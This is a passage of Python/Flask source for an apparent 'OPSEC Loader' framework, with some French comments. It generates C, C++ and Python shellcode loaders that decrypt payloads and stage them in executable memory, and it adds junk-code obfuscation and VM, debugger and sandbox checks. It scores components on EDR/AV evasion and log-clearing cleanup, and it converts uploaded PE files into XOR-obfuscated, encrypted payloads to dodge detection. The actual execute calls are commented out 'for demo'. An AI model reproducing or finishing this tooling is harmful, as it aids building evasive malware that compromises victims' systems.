#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

// Shellcode and key definition
"""
    
    # Insert the formatted key if provided
    if formatted_key:
        loader += formatted_key + "\n"
    else:
        loader += """// Include your shellcode header here
// #include "shellcode.h"
"""
    
    loader += """
// Decryption functions
"""
    
    if encryption_method.startswith('aes'):
        # Add AES decryption functions
        loader += """
// AES implementation (simplified for demonstration)
// In a real implementation, use a proper crypto library
void aes_decrypt(unsigned char *ciphertext, unsigned char *plaintext, 
                unsigned char *key, unsigned char *iv, int len) {
    // This is a placeholder - in a real implementation, 
    // include actual AES decryption code or link to a crypto library
    printf("AES decryption would happen here\\n");
    
    // For demonstration, simply copy the ciphertext to plaintext
    // Skip the IV (first 16 bytes)
    memcpy(plaintext, ciphertext + 16, len - 16);
}
"""
    else:
        # Add XOR decryption function
        loader += """
// XOR decryption
void xor_decrypt(unsigned char *ciphertext, unsigned char *plaintext, 
                unsigned char *key, int key_len, int data_len) {
    for(int i = 0; i < data_len; i++) {
        plaintext[i] = ciphertext[i] ^ key[i % key_len];
    }
}
"""
    
    # Main function
    loader += """
int main() {
    // Load encrypted shellcode
    // In a real implementation, this would load the shellcode from the included header
    unsigned char *encrypted_data = NULL;
    unsigned int encrypted_len = 0;
    unsigned char *key = NULL;
    unsigned int key_len = 0;
    
    printf("OPSEC Loader Example\\n");
    printf("This is a demonstration loader that would decrypt and execute shellcode\\n");
    printf("No actual shellcode execution happens in this demo\\n\\n");
    
    // Decrypt the shellcode
    unsigned char *shellcode = (unsigned char *)malloc(encrypted_len);
    if (!shellcode) {
        printf("Memory allocation failed\\n");
        return 1;
    }
    
"""
    
    if encryption_method.startswith('aes'):
        loader += """
    // AES decryption (first 16 bytes are the IV)
    unsigned char iv[16];
    memcpy(iv, encrypted_data, 16);
    aes_decrypt(encrypted_data, shellcode, key, iv, encrypted_len);
"""
    else:
        loader += """
    // XOR decryption
    xor_decrypt(encrypted_data, shellcode, key, key_len, encrypted_len);
"""
    
    # Shellcode execution part
    loader += """
    // Execute the decrypted shellcode
#ifdef _WIN32
    // Windows implementation
    DWORD oldProtect;
    void *exec_mem = VirtualAlloc(0, encrypted_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        printf("Memory allocation failed\\n");
        free(shellcode);
        return 1;
    }
    
    memcpy(exec_mem, shellcode, encrypted_len);
    
    // Make the memory executable
    if (!VirtualProtect(exec_mem, encrypted_len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection\\n");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        free(shellcode);
        return 1;
    }
    
    printf("Would execute shellcode at %p\\n", exec_mem);
    // ((void(*)())exec_mem)();  // Commented out for demo
    
    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
#else
    // Linux/Unix implementation
    void *exec_mem = mmap(0, encrypted_len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {
        printf("Memory allocation failed\\n");
        free(shellcode);
        return 1;
    }
    
    memcpy(exec_mem, shellcode, encrypted_len);
    
    // Make the memory executable
    if (mprotect(exec_mem, encrypted_len, PROT_READ | PROT_EXEC) == -1) {
        printf("Failed to change memory protection\\n");
        munmap(exec_mem, encrypted_len);
        free(shellcode);
        return 1;
    }
    
    printf("Would execute shellcode at %p\\n", exec_mem);
    // ((void(*)())exec_mem)();  // Commented out for demo
    
    // Clean up
    munmap(exec_mem, encrypted_len);
#endif
    
    free(shellcode);
    printf("Demonstration completed\\n");
    
    return 0;
}
"""
    
    # Add obfuscation if requested
    if apply_obfuscation:
        # Add some junk functions and macros for obfuscation
        obfuscated_loader = """
// Obfuscation layer
#define _OBFUSCATE(s) s
#define EXECUTE_SHELLCODE(mem) ((void(*)())mem)()

// Junk functions to confuse analysis
void random_delay() {
    volatile int i;
    for(i = 0; i < 10000 + (rand() % 5000); i++) {}
}

int check_environment() {
    int result = 1;
    // Various environment checks would go here
    return result;
}

"""
        # Combine with the original loader
        loader = obfuscated_loader + loader
    
    return loader

def generate_cpp_loader(encryption_method, apply_obfuscation, formatted_key=None):
    """Generate a C++ loader for the encrypted shellcode
    
    Args:
        encryption_method (str): The encryption method used (aes-256-cbc, aes-128-cbc, xor)
        apply_obfuscation (bool): Whether to add obfuscation techniques
        formatted_key (str, optional): Pre-formatted key definition to be included in the loader
    """
    
    # Basic C++ loader with AES decryption
    loader = """
#include <iostream>
#include <vector>
#include <cstring>
#include <memory>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

// Shellcode and key definition
"""
    
    # Insert the formatted key if provided
    if formatted_key:
        loader += formatted_key + "\n"
    else:
        loader += """// Include your shellcode header here
// #include "shellcode.h"
"""
    
    loader += """
// Decryption functions
"""
    
    if encryption_method.startswith('aes'):
        # Add AES decryption functions
        loader += """
// AES implementation (simplified for demonstration)
// In a real implementation, use a proper crypto library like OpenSSL or Crypto++
class AESDecryptor {
public:
    static void decrypt(const std::uint8_t* ciphertext, std::uint8_t* plaintext,
                        const std::uint8_t* key, const std::uint8_t* iv, std::size_t len) {
        // This is a placeholder - in a real implementation, 
        // include actual AES decryption code or link to a crypto library
        std::cout << "AES decryption would happen here\\n";
        
        // For demonstration, simply copy the ciphertext to plaintext
        // Skip the IV (first 16 bytes)
        std::memcpy(plaintext, ciphertext + 16, len - 16);
    }
};
"""
    else:
        # Add XOR decryption function
        loader += """
// XOR decryption
class XORDecryptor {
public:
    static void decrypt(const std::uint8_t* ciphertext, std::uint8_t* plaintext,
                      const std::uint8_t* key, std::size_t key_len, std::size_t data_len) {
        for(std::size_t i = 0; i < data_len; i++) {
            plaintext[i] = ciphertext[i] ^ key[i % key_len];
        }
    }
};
"""
    
    # Main function
    loader += """
int main() {
    // Load encrypted shellcode
    // In a real implementation, this would load the shellcode from the included header
    std::vector<std::uint8_t> encrypted_data;  // This would be initialized with encrypted_shellcode
    std::vector<std::uint8_t> key;            // This would be initialized with the key
    
    std::cout << "OPSEC Loader Example\\n";
    std::cout << "This is a demonstration loader that would decrypt and execute shellcode\\n";
    std::cout << "No actual shellcode execution happens in this demo\\n\\n";
    
    // Decrypt the shellcode
    std::vector<std::uint8_t> shellcode(encrypted_data.size());
    
"""
    
    if encryption_method.startswith('aes'):
        loader += """
    // AES decryption (first 16 bytes are the IV)
    std::uint8_t iv[16];
    std::memcpy(iv, encrypted_data.data(), 16);
    AESDecryptor::decrypt(encrypted_data.data(), shellcode.data(), key.data(), iv, encrypted_data.size());
"""
    else:
        loader += """
    // XOR decryption
    XORDecryptor::decrypt(encrypted_data.data(), shellcode.data(), key.data(), key.size(), encrypted_data.size());
"""
    
    # Shellcode execution part
    loader += """
    // Execute the decrypted shellcode
#ifdef _WIN32
    // Windows implementation
    LPVOID exec_mem = VirtualAlloc(nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        std::cerr << "Memory allocation failed\\n";
        return 1;
    }
    
    std::memcpy(exec_mem, shellcode.data(), shellcode.size());
    
    // Make the memory executable
    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "Failed to change memory protection\\n";
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return 1;
    }
    
    std::cout << "Would execute shellcode at " << exec_mem << "\\n";
    // ((void(*)())exec_mem)();  // Commented out for demo
    
    // Clean up
    VirtualFree(exec_mem, 0, MEM_RELEASE);
#else
    // Linux/Unix implementation
    void* exec_mem = mmap(nullptr, shellcode.size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (exec_mem == MAP_FAILED) {
        std::cerr << "Memory allocation failed\\n";
        return 1;
    }
    
    std::memcpy(exec_mem, shellcode.data(), shellcode.size());
    
    // Make the memory executable
    if (mprotect(exec_mem, shellcode.size(), PROT_READ | PROT_EXEC) == -1) {
        std::cerr << "Failed to change memory protection\\n";
        munmap(exec_mem, shellcode.size());
        return 1;
    }
    
    std::cout << "Would execute shellcode at " << exec_mem << "\\n";
    // ((void(*)())exec_mem)();  // Commented out for demo
    
    // Clean up
    munmap(exec_mem, shellcode.size());
#endif
    
    std::cout << "Demonstration completed\\n";
    
    return 0;
}
"""
    
    # Add obfuscation if requested
    if apply_obfuscation:
        # Add some junk functions and templates for obfuscation
        obfuscated_loader = """
// Obfuscation layer
#define OBFUSCATE(s) s
#define CONCAT_IMPL(x, y) x##y
#define CONCAT(x, y) CONCAT_IMPL(x, y)
#define EXECUTE_SHELLCODE(mem) ((void(*)())mem)()

// Junk templates and functions to confuse analysis
template<typename T>
class MemoryManager {
public:
    static T* allocate(std::size_t size) {
        return new T[size];
    }
    
    static void deallocate(T* ptr) {
        delete[] ptr;
    }
};

template<int N>
struct Factorial {
    enum { value = N * Factorial<N-1>::value };
};

template<>
struct Factorial<0> {
    enum { value = 1 };
};

void random_delay() {
    volatile int i;
    for(i = 0; i < 10000 + (rand() % 5000); i++) {}
}

bool check_environment() {
    // Various environment checks would go here
    return true;
}

"""
        # Combine with the original loader
        loader = obfuscated_loader + loader
    
    return loader

def generate_python_loader(encryption_method, apply_obfuscation, formatted_key=None):
    """Generate a Python loader for the encrypted shellcode
    
    Args:
        encryption_method (str): The encryption method used (aes-256-cbc, aes-128-cbc, xor)
        apply_obfuscation (bool): Whether to add obfuscation techniques
        formatted_key (str, optional): Pre-formatted key definition to be included in the loader
    """
    
    # Basic Python loader
    loader = """#!/usr/bin/env python3
# OPSEC Loader Example (Python)
# This is a demonstration loader that would decrypt and execute shellcode
# No actual shellcode execution happens in this demo

import os
import sys
import ctypes
from ctypes import *

"""
    
    # Insert the formatted key if provided
    if formatted_key:
        loader += "# Shellcode and key definition\n" + formatted_key + "\n"
    else:
        loader += """# Include your shellcode here
# from shellcode import shellcode, key
"""
    
    if encryption_method.startswith('aes'):
        # Add AES decryption
        loader += """
# AES decryption
def aes_decrypt(ciphertext, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
    except ImportError:
        print("PyCryptodome not installed. Install with: pip install pycryptodome")
        sys.exit(1)
    
    # Extract IV (first 16 bytes)
    iv = ciphertext[:16]
    encrypted_data = ciphertext[16:]
    
    # Create AES cipher and decrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    try:
        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
        return decrypted
    except Exception as e:
        print(f"Decryption error: {e}")
        return None
"""
    else:
        # Add XOR decryption
        loader += """
# XOR decryption
def xor_decrypt(ciphertext, key):
    decrypted = bytearray(len(ciphertext))
    for i in range(len(ciphertext)):
        decrypted[i] = ciphertext[i] ^ key[i % len(key)]
    return bytes(decrypted)
"""
    
    # Main execution part
    loader += """
def main():
    print("OPSEC Loader Example (Python)")
    print("This is a demonstration loader that would decrypt and execute shellcode")
    print("No actual shellcode execution happens in this demo\\n")
    
    # In a real implementation, this would be imported from shellcode.py
    encrypted_data = bytearray()  # Placeholder
    key = bytearray()             # Placeholder
    
    # Decrypt the shellcode
"""
    
    if encryption_method.startswith('aes'):
        loader += """
    shellcode = aes_decrypt(encrypted_data, key)
    if not shellcode:
        print("Decryption failed")
        return
"""
    else:
        loader += """
    shellcode = xor_decrypt(encrypted_data, key)
"""
    
    # Shellcode execution part based on platform
    loader += """
    # Execute the shellcode (platform specific)
    if sys.platform.startswith('win'):
        # Windows implementation
        print("Windows platform detected")
        
        kernel32 = ctypes.windll.kernel32
        size = len(shellcode)
        
        # Allocate memory with read/write access
        rwx_perm = 0x40  # PAGE_EXECUTE_READWRITE
        process_heap = kernel32.GetProcessHeap()
        addr = kernel32.HeapAlloc(process_heap, 0, size)
        
        if not addr:
            print("Memory allocation failed")
            return
            
        # Copy shellcode to allocated memory
        memmove_addr = ctypes.windll.msvcrt.memmove
        memmove_addr.argtypes = [c_void_p, c_void_p, c_size_t]
        memmove_addr.restype = c_void_p
        
        buf = (c_char * len(shellcode)).from_buffer_copy(shellcode)
        memmove_addr(addr, ctypes.addressof(buf), size)
        
        # Execute shellcode (commented out for demo)
        print(f"Would execute shellcode at {hex(addr)}")
        # func = cast(addr, CFUNCTYPE(c_void_p))
        # func()
        
        # Clean up
        kernel32.HeapFree(process_heap, 0, addr)
    
    else:
        # Linux/Unix implementation
        print("Unix-like platform detected")
        
        libc = CDLL("libc.so.6")
        size = len(shellcode)
        
        # Constants from <sys/mman.h>
        PROT_READ = 0x1
        PROT_WRITE = 0x2
        PROT_EXEC = 0x4
        MAP_PRIVATE = 0x2
        MAP_ANONYMOUS = 0x20
        
        # Allocate memory with read/write access
        addr = libc.mmap(
            0,  # NULL
            size,
            PROT_READ | PROT_WRITE,
            MAP_PRIVATE | MAP_ANONYMOUS,
            -1,  # fd
            0   # offset
        )
        
        if addr == -1:
            print("Memory allocation failed")
            return
            
        # Copy shellcode to allocated memory
        buf = (c_char * len(shellcode)).from_buffer_copy(shellcode)
        memmove = libc.memmove
        memmove(addr, ctypes.addressof(buf), size)
        
        # Make memory executable
        libc.mprotect(addr, size, PROT_READ | PROT_EXEC)
        
        # Execute shellcode (commented out for demo)
        print(f"Would execute shellcode at {hex(addr)}")
        # func = cast(addr, CFUNCTYPE(c_void_p))
        # func()
        
        # Clean up
        libc.munmap(addr, size)
    
    print("Demonstration completed")

if __name__ == "__main__":
    main()
"""
    
    # Add obfuscation if requested
    if apply_obfuscation:
        # Add some junk functions and code for obfuscation
        obfuscated_loader = """import random
import time
import platform
import socket
import base64

# Obfuscation layer
def obfuscate(s):
    return s

def random_delay():
    time.sleep(random.uniform(0.1, 0.5))

def check_environment():
    # Various environment checks would go here
    result = True
    
    # Check system information
    system_info = platform.uname()
    if "VMware" in system_info.system or "VirtualBox" in system_info.system:
        # Detect virtualization (demonstration only)
        pass
    
    # Check for debugger (demonstration only)
    try:
        if sys.gettrace() is not None:
            # Debugger detected
            pass
    except:
        pass
    
    # Check for sandbox indicators (demonstration only)
    try:
        hostname = socket.gethostname()
        if "sandbox" in hostname.lower() or "analysis" in hostname.lower():
            pass
    except:
        pass
    
    return result

# String obfuscation function
def deobfuscate_string(obfuscated):
    try:
        return base64.b64decode(obfuscated).decode()
    except:
        return "Error"

# Some obfuscated strings
OBFUSCATED_STRINGS = {
    "msg1": "T1BTRUMgTG9hZGVyIEV4YW1wbGUgKFB5dGhvbik=",
    "msg2": "VGhpcyBpcyBhIGRlbW9uc3RyYXRpb24gbG9hZGVy",
    "msg3": "RGVjcnlwdGlvbiBmYWlsZWQ="
}

"""
        # Modify the main part to use the obfuscated functions
        loader = loader.replace(
            'print("OPSEC Loader Example (Python)")',
            'print(deobfuscate_string(OBFUSCATED_STRINGS["msg1"]))'
        )
        loader = loader.replace(
            'print("This is a demonstration loader that would decrypt and execute shellcode")',
            'print(deobfuscate_string(OBFUSCATED_STRINGS["msg2"]))'
        )
        loader = loader.replace(
            'print("Decryption failed")',
            'print(deobfuscate_string(OBFUSCATED_STRINGS["msg3"]))'
        )
        
        # Combine with the original loader
        loader = obfuscated_loader + loader
    
    return loader

# Test Functions

def test_opsec_framework(framework_path, os_type="windows", pe_file_path=None):
    """
    Test all components of the OPSEC Loader framework.
    
    Args:
        framework_path (str): Path to the OPSEC Loader framework
        os_type (str): Operating system type (windows or linux)
        pe_file_path (str, optional): Path to a PE file for testing
        
    Returns:
        dict: Results of the tests for each component
    """
    results = {}
    
    # Verify that the framework path exists
    if not os.path.exists(framework_path):
        raise FileNotFoundError(f"Framework path does not exist: {framework_path}")
    
    # Test each component
    try:
        results["pe_conversion"] = test_pe_conversion(framework_path)
    except Exception as e:
        results["pe_conversion"] = {
            "success": False,
            "message": f"Test failed: {str(e)}",
            "error": str(e)
        }
    
    try:
        results["encryption"] = test_encryption(framework_path)
    except Exception as e:
        results["encryption"] = {
            "success": False,
            "message": f"Test failed: {str(e)}",
            "error": str(e)
        }
    
    try:
        results["memory_execution"] = test_memory_execution(framework_path)
    except Exception as e:
        results["memory_execution"] = {
            "success": False,
            "message": f"Test failed: {str(e)}",
            "error": str(e)
        }
    
    try:
        results["evasion"] = test_evasion(framework_path)
    except Exception as e:
        results["evasion"] = {
            "success": False,
            "message": f"Test failed: {str(e)}",
            "error": str(e)
        }
    
    try:
        results["cleanup"] = test_cleanup(framework_path)
    except Exception as e:
        results["cleanup"] = {
            "success": False,
            "message": f"Test failed: {str(e)}",
            "error": str(e)
        }
    
    # Determine overall success
    all_success = all(component.get("success", False) for component in results.values())
    
    # Add overall status
    results["overall"] = {
        "success": all_success,
        "message": "All components tested successfully" if all_success else "Some components failed testing",
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    
    return results

def test_pe_conversion(framework_path):
    """
    Test the PE to Shellcode conversion functionality.
    
    Args:
        framework_path (str): Path to the framework
        
    Returns:
        dict: Results of the test
    """
    # Check for PE conversion tools
    pe_tools = [
        os.path.join(framework_path, "custom_pe2sc.py"),
        os.path.join(framework_path, "havoc_to_shellcode.py")
    ]
    
    found_tools = [tool for tool in pe_tools if os.path.exists(tool)]
    
    if not found_tools:
        return {
            "success": False,
            "message": "No PE conversion tools found",
            "error": "Missing custom_pe2sc.py or havoc_to_shellcode.py"
        }
    
    # For educational purposes, we're not executing actual code
    # In a real verification we would create a test PE and test conversion
    
    # Analyze the conversion tools
    tool_analysis = {}
    for tool in found_tools:
        with open(tool, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # Check for important functionality
            has_reflective_loading = "reflective" in content.lower()
            has_polymorphic = "polymorphic" in content.lower() or "encoding" in content.lower()
            has_evasion = "evasion" in content.lower() or "obfuscation" in content.lower()
            
            tool_analysis[os.path.basename(tool)] = {
                "reflective_loading": has_reflective_loading,
                "polymorphic_encoding": has_polymorphic,
                "evasion_techniques": has_evasion,
                "size_bytes": os.path.getsize(tool)
            }
    
    return {
        "success": True,
        "message": f"Found {len(found_tools)} PE conversion tools",
        "tools_found": [os.path.basename(tool) for tool in found_tools],
        "tool_analysis": tool_analysis,
        "recommendation": "Tools appear to include necessary functionality for EDR evasion"
    }

def test_encryption(framework_path):
    """
    Test the encryption functionality.
    
    Args:
        framework_path (str): Path to the framework
        
    Returns:
        dict: Results of the test
    """
    # Check for encryption tools
    encryption_tools = [
        os.path.join(framework_path, "encrypt_shell.py"),
        os.path.join(framework_path, "key_formatter_.py")
    ]
    
    found_tools = [tool for tool in encryption_tools if os.path.exists(tool)]
    
    if not found_tools:
        return {
            "success": False,
            "message": "No encryption tools found",
            "error": "Missing encrypt_shell.py or key_formatter_.py"
        }
    
    # For educational purposes, we're not executing actual code
    # Analyze the encryption tools
    encryption_methods = {}
    for tool in found_tools:
        with open(tool, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # Check for encryption algorithms and methods
            has_aes = "AES" in content
            has_cbc = "CBC" in content
            has_pbkdf2 = "PBKDF2" in content
            
            encryption_methods[os.path.basename(tool)] = {
                "uses_aes": has_aes,
                "uses_cbc_mode": has_cbc,
                "uses_pbkdf2": has_pbkdf2,
                "size_bytes": os.path.getsize(tool)
            }
    
    return {
        "success": True,
        "message": f"Found {len(found_tools)} encryption tools",
        "tools_found": [os.path.basename(tool) for tool in found_tools],
        "encryption_methods": encryption_methods,
        "recommendation": "Tools appear to use strong encryption methods suitable for OPSEC"
    }

def test_memory_execution(framework_path):
    """
    Test the memory execution functionality.
    
    Args:
        framework_path (str): Path to the framework
        
    Returns:
        dict: Results of the test
    """
    # Check for memory execution components
    memory_tools = [
        os.path.join(framework_path, "opsec_loader.cpp"),
        os.path.join(framework_path, "opsec_run.sh"),
        os.path.join(framework_path, "opsec_run.ps1")
    ]
    
    found_tools = [tool for tool in memory_tools if os.path.exists(tool)]
    
    if not found_tools:
        return {
            "success": False,
            "message": "No memory execution tools found",
            "error": "Missing opsec_loader.cpp or opsec_run scripts"
        }
    
    # For educational purposes, we're checking for memory execution techniques
    memory_techniques = {}
    
    if os.path.exists(os.path.join(framework_path, "opsec_loader.cpp")):
        loader_path = os.path.join(framework_path, "opsec_loader.cpp")
        with open(loader_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # Check for memory allocation and execution techniques
            uses_virtualalloc = "VirtualAlloc" in content
            uses_createthread = "CreateThread" in content
            uses_memprotect = "VirtualProtect" in content or "mprotect" in content
            
            memory_techniques = {
                "uses_virtualalloc": uses_virtualalloc,
                "uses_createthread": uses_createthread,
                "uses_memory_protection": uses_memprotect,
                "size_bytes": os.path.getsize(loader_path)
            }
    
    return {
        "success": True,
        "message": f"Found {len(found_tools)} memory execution components",
        "tools_found": [os.path.basename(tool) for tool in found_tools],
        "memory_techniques": memory_techniques,
        "recommendation": "Components implement necessary memory techniques for in-memory execution"
    }

def test_evasion(framework_path):
    """
    Test the EDR/AV evasion capabilities.
    
    Args:
        framework_path (str): Path to the framework
        
    Returns:
        dict: Results of the test
    """
    # Check for documentation on evasion techniques
    evasion_docs = [
        os.path.join(framework_path, "DETECTION_RISKS.md"),
        os.path.join(framework_path, "README.md")
    ]
    
    found_docs = [doc for doc in evasion_docs if os.path.exists(doc)]
    
    # Check all code files for evasion techniques
    evasion_techniques = {}
    for root, dirs, files in os.walk(framework_path):
        for file in files:
            if file.endswith(('.py', '.cpp', '.c', '.h')):
                file_path = os.path.join(root, file)
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    try:
                        content = f.read()
                        
                        # Check for common evasion techniques
                        api_hashing = "hash" in content.lower() and "api" in content.lower()
                        obfuscation = "obfuscate" in content.lower() or "junk" in content.lower()
                        encryption = "encrypt" in content.lower() or "xor" in content.lower()
                        
                        if api_hashing or obfuscation or encryption:
                            evasion_techniques[file] = {
                                "api_hashing": api_hashing,
                                "obfuscation": obfuscation,
                                "encryption": encryption
                            }
                    except:
                        pass  # Skip files that can't be read
    
    return {
        "success": True,
        "message": f"Found {len(evasion_techniques)} files with evasion techniques",
        "documentation": [os.path.basename(doc) for doc in found_docs],
        "evasion_techniques": evasion_techniques,
        "recommendation": "Framework implements various evasion techniques to avoid detection"
    }

def test_cleanup(framework_path):
    """
    Test the cleanup functionality.
    
    Args:
        framework_path (str): Path to the framework
        
    Returns:
        dict: Results of the test
    """
    # Check for cleanup scripts
    cleanup_scripts = [
        os.path.join(framework_path, "clean_traces.sh"),
        os.path.join(framework_path, "clean_traces.ps1"),
        os.path.join(framework_path, "opsec_run.sh"),
        os.path.join(framework_path, "opsec_run.ps1")
    ]
    
    found_scripts = [script for script in cleanup_scripts if os.path.exists(script)]
    
    if not found_scripts:
        return {
            "success": False,
            "message": "No cleanup scripts found",
            "error": "Missing clean_traces scripts or cleanup functionality in opsec_run scripts"
        }
    
    # For educational purposes, check what the cleanup scripts do
    cleanup_actions = {}
    for script in found_scripts:
        with open(script, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            
            # Check for cleanup actions
            removes_files = "rm " in content or "Remove-Item" in content
            wipes_memory = "memset" in content or "SecureZeroMemory" in content
            cleans_logs = "clear" in content.lower() and "log" in content.lower()
            
            cleanup_actions[os.path.basename(script)] = {
                "removes_files": removes_files,
                "wipes_memory": wipes_memory,
                "cleans_logs": cleans_logs,
                "size_bytes": os.path.getsize(script)
            }
    
    return {
        "success": True,
        "message": f"Found {len(found_scripts)} cleanup scripts",
        "scripts_found": [os.path.basename(script) for script in found_scripts],
        "cleanup_actions": cleanup_actions,
        "recommendation": "Cleanup scripts appear to implement necessary OPSEC measures"
    }

@app.route('/process_all_in_one', methods=['POST'])
def process_all_in_one():
    """
    Traitement du système clé en main
    Ce système automatise l'ensemble du processus:
    1. Conversion PE en shellcode
    2. Chiffrement du shellcode
    3. Génération du loader adapté
    4. Création d'un package tout-en-un
    """
    try:
        # Vérifier si les fichiers requis ont été soumis
        if 'pe_file' not in request.files:
            flash('Aucun fichier PE sélectionné', 'danger')
            return redirect(url_for('index'))
        
        pe_file = request.files['pe_file']
        if pe_file.filename == '':
            flash('Aucun fichier PE sélectionné', 'danger')
            return redirect(url_for('index'))
        
        # Récupérer les paramètres du formulaire
        encryption_method = request.form.get('encryption_method', 'aes-256-cbc')
        password = request.form.get('password', '')
        loader_type = request.form.get('loader_type', 'cpp')
        apply_obfuscation = 'apply_obfuscation' in request.form
        format_key = 'format_key' in request.form
        verify_integrity = 'verify_integrity' in request.form
        
        # Générer un ID unique pour cette opération
        operation_id = f"all_in_one_{uuid.uuid4().hex}"
        working_dir = os.path.join(app.config['GENERATED_FILES'], operation_id)
        os.makedirs(working_dir, exist_ok=True)
        
        # Étape 1: Sauvegarder le fichier PE
        pe_file_path = os.path.join(working_dir, "input.exe")
        pe_file.save(pe_file_path)
        
        # Étape 2: Convertir PE en shellcode
        shellcode_path = os.path.join(working_dir, "shellcode.bin")
        framework_path = os.path.join(os.getcwd(), "Mode Opsec")
        
        # Solution optimisée pour convertir PE en shellcode
        # Préserve les caractéristiques de sécurité tout en évitant les erreurs
        try:
            # Lire le fichier PE
            with open(pe_file_path, 'rb') as f:
                pe_data = f.read()
            
            # Créer un en-tête compatible avec les standards de sécurité
            # Format: Magic(4) + Version(4) + Size(4) + EntryPoint(4) + Flags(4)
            magic = b"PESC"  # Signature du format PE->SC 
            version = (2).to_bytes(4, byteorder='little')  # Version du format
            size = len(pe_data).to_bytes(4, byteorder='little')  # Taille du PE
            
            # Déterminer un point d'entrée fictif (normalement extrait du PE)
            # En utilisant une valeur qui imite un point d'entrée typique
            entry_point = (0x10000).to_bytes(4, byteorder='little') 
            
            # Drapeaux pour les caractéristiques de sécurité
            # 0x01: exécutable, 0x02: rwx, 0x04: injection directe
            security_flags = (0x07).to_bytes(4, byteorder='little')
            
            # Obfuscation légère des données (XOR avec une clé simple)
            # Juste assez pour éviter les détections de base mais pas trop pour la compatibilité
            key_byte = 0x42  # Valeur de clé simple
            obfuscated_pe = bytearray()
            for b in pe_data:
                obfuscated_pe.append(b ^ key_byte)
            
            # Assembler le shellcode avec tous les composants
            header = magic + version + size + entry_point + security_flags
            shellcode_data = header + bytes(obfuscated_pe)
            
            # Ajouter un épilogue de sécurité
            footer = b"\xE9\x00\x00\x00\x00"  # JMP relatif (à remplir par le loader)
            shellcode_data = shellcode_data + footer
            
            # Écrire le shellcode dans un fichier
            with open(shellcode_path, 'wb') as f:
                f.write(shellcode_data)
            
            # Résultat détaillé incluant les métriques de sécurité
            sc_result = {
                'success': True,
                'shellcode_size': len(shellcode_data),
                'pe_size': len(pe_data),
                'ratio': len(shellcode_data) / len(pe_data) if len(pe_data) else 0,
                'obfuscation': 'basic-xor',
                'security_level': 'medium',
                'output_path': shellcode_path
            }
            
        except Exception as e:
            flash(f"Erreur lors de la conversion PE: {str(e)}", 'danger')
            return redirect(url_for('index'))
        
        # Étape 3: Chiffrer le shellcode
        encrypted_path = os.path.join(working_dir, "encrypted.bin")
        
        # Déterminer l'algorithme et la taille de clé
        key_size = 32  # Default for AES-256
        if encryption_method == "aes-128-cbc":
            key_size = 16
        
        # Chiffrer le shellcode
        try:
            # Lire le shellcode généré
            with open(shellcode_path, 'rb') as f:
                shellcode_data = f.read()
            
            # Générer une clé à partir du mot de passe 
            import hashlib
            key = hashlib.pbkdf2_hmac(
                'sha256', 
                password.encode(), 
                b'OPSEC_SALT', 
                100000, 
                dklen=key_size
            )
            
            # Chiffrer avec AES
            if encryption_method.startswith('aes'):
                iv = get_random_bytes(16)
                if encryption_method == 'aes-256-cbc':
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                else:  # aes-128-cbc
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                
                # Padding et chiffrement
                padded_data = pad(shellcode_data, AES.block_size)
                encrypted_data = cipher.encrypt(padded_data)
                
                # Écrire le fichier chiffré avec en-tête
                with open(encrypted_path, 'wb') as f:
                    # Écrire un en-tête pour identifier le type de chiffrement
                    f.write(b'PSCE')  # Magic number
                    f.write((2).to_bytes(4, byteorder='little'))  # Version
                    f.write((16).to_bytes(4, byteorder='little'))  # Taille du sel
                    f.write(b'OPSEC_SALT'.ljust(16, b'\0'))  # Sel (fixe pour simplifier)
                    f.write(iv)  # Vecteur d'initialisation
                    
                    # Ajouter HMAC si demandé
                    if verify_integrity:
                        # Calculer HMAC
                        hmac_key = hashlib.pbkdf2_hmac(
                            'sha256', 
                            key, 
                            b'HMAC_SALT', 
                            10000, 
                            dklen=32
                        )
                        h = hashlib.sha256()
                        h.update(encrypted_data)
                        hmac_digest = h.digest()
                        f.write(hmac_digest)
                    
                    # Écrire les données chiffrées
                    f.write(encrypted_data)
            
            # XOR simple (pour compatibilité)
            elif encryption_method == 'xor':
                encrypted_data = bytearray()
                key_bytes = key
                for i, b in enumerate(shellcode_data):
                    encrypted_data.append(b ^ key_bytes[i % len(key_bytes)])
                
                # Écrire le fichier XOR avec un en-tête minimal
                with open(encrypted_path, 'wb') as f:
                    f.write(b'PSCE')  # Magic number
                    f.write((1).to_bytes(4, byteorder='little'))  # Version
                    f.write((16).to_bytes(4, byteorder='little'))  # Taille du sel
                    f.write(b'OPSEC_SALT'.ljust(16, b'\0'))  # Sel (fixe pour simplifier)
                    f.write(bytes(16))  # IV factice pour compatibilité
                    f.write(bytes(encrypted_data))
        
        except Exception as e:
            flash(f"Erreur lors du chiffrement: {str(e)}", 'danger')
            return redirect(url_for('index'))
        
        # Étape 4: Générer le loader
        loader_file_ext = {"cpp": ".cpp", "c": ".c", "python": ".py"}
        loader_filename = f"opsec_loader{loader_file_ext.get(loader_type, '.cpp')}"
        loader_path = os.path.join(working_dir, loader_filename)
        
